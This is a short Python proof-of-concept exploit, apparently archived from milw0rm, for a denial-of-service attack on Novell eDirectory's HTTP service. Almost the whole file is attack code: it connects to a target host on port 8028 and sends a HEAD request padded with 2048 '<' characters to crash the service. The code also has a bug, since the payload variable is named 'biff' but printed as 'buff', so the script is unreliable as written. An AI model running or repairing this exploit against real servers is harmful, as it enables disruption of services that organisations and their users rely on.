#!/usr/bin/python
# Novel eDirectory HTTP DOS
# Discovered and coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/novel-edir.py.txt

import socket
import os
import sys
from time import sleep

biff="<"*2048
print "[*] Payload sent "+ str(len(buff))
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect ( ( sys.argv[1], 8028 ) )
expl.send ( 'HEAD '+biff+' HTTP/1.1\r\nHost: 192.168.1.10:20\r\nUser-Agent: Mozilla/4.0 (Linux 2.6.21.5) Java/1.5.0_02\r\n\r\n')
data=expl.recv(1024)
print data
expl.close()

# milw0rm.com [2008-04-02]
